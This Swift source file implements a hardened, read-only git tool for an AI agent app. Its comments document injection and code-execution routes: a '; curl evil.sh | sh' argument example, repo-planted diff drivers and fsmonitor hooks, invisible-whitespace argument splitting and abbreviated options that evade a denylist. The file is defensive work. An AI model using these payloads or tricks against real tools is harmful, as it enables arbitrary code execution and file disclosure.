// SPDX-License-Identifier: AGPL-3.0-only
// Copyright © 2026 Raj Singh
//
//  GitIntegrationTool.swift
//  Devgentic
//

import Foundation
import os

private let logger = DGLogger(category: "GitTool")

// MARK: - Git Tool

/// Result of resolving a git action to an argument vector.
///
/// `argv`, not a command string. The previous form built `"git -C \"\(repoPath)\" diff
/// \(extraArgs)"` and handed it to `zsh -c`, with `extraArgs` interpolated UNQUOTED — so
/// `args: "; curl evil.sh | sh"` needed no quote-break at all and simply ran. `args` and
/// `path` are tool arguments supplied by the model, which means anything that can influence
/// the model could reach a shell through a tool that profiles enable precisely BECAUSE they
/// are withholding shell access.
enum GitCommandResolution {
    case argv([String])
    case error(String)
}

/// Pure logic for building git argument vectors from action + args. Extracted for testability.
enum GitCommandBuilder {

    /// Splits a shell-style argument STRING into argv words — and does nothing else.
    ///
    /// `args` is documented as free-form git arguments (`-n 5`, `--author="J Smith"`), so it
    /// genuinely needs word-splitting and quote removal. It does NOT need, and deliberately
    /// does not get, any other shell behaviour: no globbing, no `$VAR`, no `$(…)`, no
    /// operators. `;` and `|` survive tokenisation as ordinary characters and reach `git` as
    /// literal arguments, where they are rejected as unknown revisions rather than executed.
    ///
    /// A naive `split(separator: " ")` would be wrong in the other direction — it breaks
    /// `--author="J Smith"` into two arguments — which is why this is a real tokenizer and not
    /// a one-liner.
    ///
    /// Separators are the POSIX `IFS` set this is emulating — space, tab, newline (and CR, for
    /// text that arrived with Windows line endings) — and deliberately NOT
    /// `Character.isWhitespace`, which is the UNICODE whitespace set. The difference is
    /// exploitable: `Character.isWhitespace` is true for U+00A0 NBSP, U+2000–200A, U+2028/2029,
    /// U+3000 and more, so `HEAD~1<NBSP>--output=/etc/x` split into two argv words — the second
    /// an OPTION — where a shell, and git handed the same bytes as one argument, both keep it
    /// as a single literal token. An operator reading the raw `args` string sees one innocuous
    /// revision name, because the separator is invisible.
    private static let separatorScalars: Set<Unicode.Scalar> = [" ", "\t", "\n", "\r"]

    /// Tested scalar-wise because a Swift `Character` is a grapheme CLUSTER: `\r\n` is a single
    /// Character and so matches neither `"\r"` nor `"\n"` in a `Set<Character>`. Getting that
    /// wrong fails in the safe direction — the tokens stay joined and inert — but it silently
    /// mangles any `args` that arrived with Windows line endings.
    private static func isSeparator(_ character: Character) -> Bool {
        character.unicodeScalars.allSatisfy { separatorScalars.contains($0) }
    }

    static func tokenize(_ input: String) -> [String] {
        var tokens: [String] = []
        var current = ""
        var started = false
        var quote: Character?
        var escaped = false

        for character in input {
            if escaped {
                current.append(character); started = true; escaped = false; continue
            }
            // Inside single quotes a backslash is literal, matching shell word-splitting.
            if character == "\\" && quote != "'" {
                escaped = true; started = true; continue
            }
            if let open = quote {
                if character == open { quote = nil } else { current.append(character) }
                started = true
                continue
            }
            if character == "'" || character == "\"" {
                quote = character; started = true; continue
            }
            if isSeparator(character) {
                if started { tokens.append(current); current = ""; started = false }
                continue
            }
            current.append(character); started = true
        }
        if started { tokens.append(current) }
        return tokens
    }

    /// Global `-c` overrides applied to EVERY invocation, ahead of the subcommand.
    ///
    /// A repository is data, but git treats parts of it as CODE: `diff.external` and
    /// `core.fsmonitor` name programs git executes, and both live in `<repo>/.git/config` —
    /// a file any write primitive can plant (including, before `deniedAnywhere` below, this
    /// tool's own `--output`). The trigger then needs no arguments at all: a bare `diff` runs
    /// `diff.external`, a bare `status` runs `core.fsmonitor`. **Argument validation alone
    /// therefore cannot close this**, which is why the config is neutralised at the point of
    /// invocation rather than filtered at the argument layer.
    ///
    /// These are `-c` (a PRE-subcommand global) and not the equivalent flags on purpose:
    /// `args` is always appended AFTER the subcommand, and a flag can be re-enabled by a later
    /// one. Verified against /usr/bin/git: `-c diff.external=` wins even when the caller passes
    /// `--ext-diff`, whereas `--no-ext-diff --ext-diff` re-enables the external program.
    static let hardening: [String] = [
        // Runs a program whenever git consults the index — including `status`, the one action
        // that takes no arguments at all.
        "-c", "core.fsmonitor=",
        // Runs a program for every file diffed, on a bare `diff`, with no opt-in flag needed.
        "-c", "diff.external=",
        // Nothing here should ever fire a repo-supplied hook.
        "-c", "core.hooksPath=/dev/null",
        // git only pages onto a tty and `ProcessRunner` hands it a pipe, so this changes
        // nothing today — it removes the dependency on that remaining true.
        "-c", "core.pager=cat",
    ]

    /// Flags that suppress repo-nominated diff programs, passed on every diff-family action.
    ///
    /// ⚠️ `hardening` is NOT sufficient on its own, and the earlier claim that it was is wrong.
    /// `-c diff.external=` empties the GLOBAL external-diff hook, but a repository can name its
    /// own driver — `.gitattributes` saying `*.dat diff=evil` plus `[diff "evil"] command = …`
    /// in `.git/config` — and the driver's key contains a repo-chosen NAME, so no fixed `-c`
    /// can empty it. Reproduced against /usr/bin/git 2026-07-31: with the full `hardening` set
    /// applied, a plain `git diff` on such a repo still executed the named program. `--no-ext-diff`
    /// stops it; `--no-textconv` stops the textconv variant.
    ///
    /// These are passed BEFORE the caller's `args` so a later `--ext-diff` could re-enable them —
    /// which is why both are also in `deniedAnywhere`.
    static let diffProgramSuppression: [String] = ["--no-ext-diff", "--no-textconv"]

    /// Options refused for every action.
    ///
    /// **Argv stops the SHELL; it does not stop git's own option parser.** Each entry was
    /// confirmed to work against /usr/bin/git before being listed:
    ///   - `--output=<path>` creates or TRUNCATES any file on disk and fills it with git output.
    ///   - `--no-index <a> <b>` diffs two arbitrary paths; `-C <repo>` is not honoured, so it
    ///     reads anything this process can read.
    ///   - `--contents <file>` (blame) reads an arbitrary file and echoes it into the output.
    ///   - `--ext-diff` / `--textconv` re-request a repo-nominated program. `hardening` already
    ///     empties `diff.external`, but a `.gitattributes` textconv driver cannot be neutralised
    ///     by config (its name is chosen by the repo), so `--no-textconv` is passed per-action
    ///     below and `--textconv` must not be able to countermand it.
    ///
    /// A denylist is inherently incomplete — a future git option could open a new primitive.
    /// It is the SECOND layer; `hardening` is what makes code execution unreachable.
    static let deniedAnywhere: Set<String> = [
        "--output", "--no-index", "--contents", "--ext-diff", "--textconv",
    ]

    /// `branch` is forced into list mode with `-a`, which already refuses a bare branch name —
    /// but not these, which mutate the repository: `branch -a -M <new>` renames the checked-out
    /// branch, and `-u`/`--track`/`--edit-description` write config or refs.
    ///
    /// Scoped to `branch` rather than global because `-c` and `-C` mean "copy branch" HERE and
    /// something harmless elsewhere (`git log -c` is a combined diff), and `-t` likewise.
    static let deniedForBranch: Set<String> = [
        "-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C", "--copy",
        "-u", "--set-upstream-to", "--unset-upstream", "--edit-description",
        "-f", "--force", "-t", "--track", "--create-reflog",
    ]

    /// Matches on the option NAME — the part before any `=` — so `--output=x` and `--output x`
    /// are both caught.
    ///
    /// ⚠️ Long options match by PREFIX, not exact equality, and the comment that used to sit here
    /// claiming "git does not accept abbreviated long options — verified" was simply false.
    /// Reproduced 2026-07-31: `git blame --cont <file> a.txt` resolves to `--contents` and printed
    /// the file, walking straight past an exact-match denylist. Git accepts any UNAMBIGUOUS
    /// abbreviation of a long option, so a denylist keyed on full spellings only stops the
    /// spelling an honest caller would use.
    ///
    /// Prefix matching is deliberately over-broad: `--co` is refused even though git would call
    /// it ambiguous, because refusing a legal-but-ambiguous option costs a caller nothing and
    /// reasoning about which abbreviations are currently unambiguous means tracking git's option
    /// table forever. Short options stay exact — `-c` is one flag, not a prefix of anything.
    static func rejectionReason(action: String, tokens: [String]) -> String? {
        let denied = deniedAnywhere.union(action == "branch" ? deniedForBranch : [])
        for token in tokens where token.hasPrefix("-") {
            let name = token.split(separator: "=", maxSplits: 1).first.map(String.init) ?? token
            let hit = denied.first { candidate in
                guard candidate.hasPrefix("--") else { return candidate == name }   // short: exact
                guard name.hasPrefix("--"), name.count > 2 else { return false }
                return candidate.hasPrefix(name)                                    // long: prefix
            }
            if let hit {
                return "Error: option '\(name)' is not permitted"
                    + (hit == name ? "" : " (it abbreviates '\(hit)')")
                    + " — git_tool is read-only and confined to the repository. Remove it and retry."
            }
        }
        return nil
    }

    static func resolve(action: String, repoPath: String, extraArgs: String) -> GitCommandResolution {
        // `-C <path>` as two argv elements: the path is data, never part of a command string.
        let base = ["-C", repoPath] + hardening
        let extra = tokenize(extraArgs)

        // Rejected BEFORE the action switch so an unknown action cannot be used to probe which
        // options a given subcommand accepts.
        if let reason = rejectionReason(action: action, tokens: extra) {
            return .error(reason)
        }

        // `diffProgramSuppression` (`--no-ext-diff --no-textconv`) on every action that renders
        // file content. A `.gitattributes` entry can nominate a diff driver by NAME, and the
        // driver's config key contains that name — so no fixed `-c` in `hardening` can empty it.
        // Reproduced 2026-07-31: with the full hardening applied, a plain `diff` on a repo
        // carrying `[diff "evil"] command = …` still executed the program. Both flags are also
        // denied in `extra`, so nothing the caller passes can countermand them.
        switch action {
        case "status":
            return .argv(base + ["status", "--short"])
        case "log":
            return .argv(base + ["log"] + diffProgramSuppression + (extra.isEmpty ? ["-n", "10", "--oneline"] : extra))
        case "diff":
            return .argv(base + ["diff"] + diffProgramSuppression + extra)
        case "branch":
            return .argv(base + ["branch", "-a"] + extra)
        case "stash_list":
            return .argv(base + ["stash", "list"])
        case "blame":
            // Checked AFTER tokenising, so whitespace-only `args` is caught here rather than
            // reaching git as `blame` with no file and failing with a less useful message.
            guard !extra.isEmpty else {
                return .error("Error: 'args' must contain the filename for blame.")
            }
            return .argv(base + ["blame"] + diffProgramSuppression + extra)
        case "show":
            return .argv(base + ["show"] + diffProgramSuppression + (extra.isEmpty ? ["HEAD"] : extra) + ["--stat"])
        default:
            return .error("Error: Unknown git action '\(action)'. Use status/log/diff/branch/stash_list/blame/show.")
        }
    }
}

struct GitTool: DevgenticTool {
    let name = "git_tool"
    let category = "Developer & Diagnostics"
    let description = "Performs Git operations with structured output: status, log, diff, branch, stash, and blame."

    struct Arguments: Decodable, Sendable {
        let action: String
        let path: String?
        let args: String?

        private struct DynamicKey: CodingKey {
            var stringValue: String
            init?(stringValue: String) { self.stringValue = stringValue }
            var intValue: Int? { return nil }
            init?(intValue: Int) { return nil }
        }

        init(from decoder: Decoder) throws {
            let container = try decoder.container(keyedBy: DynamicKey.self)

            var foundAction: String? = nil
            for key in ["action", "command", "cmd", "op"] {
                if let codingKey = DynamicKey(stringValue: key),
                   let val = try? container.decode(String.self, forKey: codingKey) {
                    foundAction = val
                    break
                }
            }
            guard let a = foundAction else {
                throw DecodingError.dataCorrupted(DecodingError.Context(codingPath: decoder.codingPath, debugDescription: "Missing 'action'"))
            }
            self.action = a
            self.path = (try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "path")!))
            self.args = (try? container.decodeIfPresent(String.self, forKey: DynamicKey(stringValue: "args")!))
        }
    }

    var parameterSchema: ToolParameters {
        return SchemaBuilder.object(
            properties: [
                ("action", "string", "Git action: 'status', 'log', 'diff', 'branch', 'stash_list', 'blame', 'show'"),
                ("path", "string", "Repository path. Required — pass the project root."),
                ("args", "string", "Additional arguments (e.g., '-n 5' for log, filename for blame)")
            ],
            required: ["action", "path"]
        )
    }

    func call(arguments: Arguments) async throws -> String {
        guard let rawPath = arguments.path, !rawPath.isEmpty else {
            return "Error: 'path' is required. Pass the project root (repository path)."
        }
        let repoPath = (rawPath as NSString).expandingTildeInPath
        guard FileManager.default.fileExists(atPath: repoPath) else {
            return "Error: path '\(repoPath)' does not exist."
        }
        let extraArgs = arguments.args ?? ""

        let resolution = GitCommandBuilder.resolve(action: arguments.action, repoPath: repoPath, extraArgs: extraArgs)
        let gitArgv: [String]
        switch resolution {
        case .argv(let argv):
            gitArgv = argv
        case .error(let msg):
            // A refusal is only visible to the MODEL unless it is logged. An operator asking
            // "why did the agent claim it could not read that file?" otherwise has nothing —
            // the tool returned a string and no trace of the denied option survives.
            logger.notice("[GIT_DENY] action='\(arguments.action)' refused — \(msg) | args: \(extraArgs)")
            return msg
        }

        do {
            // `ProcessRunner` drains stdout and stderr CONCURRENTLY. This site read them in
            // sequence after `waitUntilExit()`, which deadlocks once either passes the ~64 KB
            // pipe buffer — and `git log` / `git diff` pass it routinely.
            //
            // Invoked DIRECTLY, never through `zsh -c`: see `GitCommandResolution`. `TERM` is
            // still forced to dumb, which is what the shell path was supplying — it keeps git
            // from emitting colour escapes into output the model has to read.
            var env = ProcessInfo.processInfo.environment
            env["TERM"] = "dumb"
            let run = try ProcessRunner.run(executable: "/usr/bin/git", arguments: gitArgv, environment: env)

            // "Error:"-prefixed so `ToolExecutionMediator.isSemanticFailure` actually classifies
            // it. The previous "Git error:" missed by ONE WORD — the sniffer tests
            // `hasPrefix("error")`, so this tool correctly detected the failure, reported it,
            // and then had it recorded as a success.
            //
            // The old condition also required non-empty stderr, so a non-zero exit with silent
            // stderr fell through to the success return — the exit code counted only when
            // stderr happened to be populated.
            guard run.succeeded else {
                let detail = run.standardError.isEmpty
                    ? (run.standardOutput.isEmpty ? "(no output on stdout or stderr)" : run.standardOutput)
                    : run.standardError
                return "Error: git \(arguments.action) failed (exit \(run.exitCode))\n\(detail)"
            }

            let maxOutput = 6000
            let output = run.standardOutput
            let result = output.count > maxOutput ? String(output.prefix(maxOutput)) + "\n...[Truncated]" : output

            return "git \(arguments.action):\n\(result)"
        } catch {
            return "Error: \(error.localizedDescription)"
        }
    }
}
